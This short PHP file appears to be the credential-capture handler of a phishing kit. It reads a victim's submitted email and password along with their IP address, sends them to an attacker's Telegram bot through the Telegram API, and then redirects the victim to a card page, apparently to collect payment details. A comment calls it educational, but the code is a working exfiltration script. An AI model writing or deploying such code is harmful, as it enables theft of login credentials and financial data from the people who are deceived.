<?php
include("sand_email.php"); 
include("detect.php");
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Assuming you have a form field for email and password
    $email = filter_input(INPUT_POST, 'username', FILTER_SANITIZE_EMAIL);
    $pass = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);


    $ip = getUserIP();

 

    // For educational purposes, here's how you might format a message
    $message = " ========= login Bouhmid============" . 
    "\nEmail : " . $email . 
    "\nPasww : " . $pass  .
    "\nIP    : " . $ip

    ; 


     $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    
    // Use file_get_contents or cURL to send the message
     $response = file_get_contents($url); // Make sure allow_url_fopen is enabled in your php.ini
   
     HEADER("Location: ../card.php");


}



?>
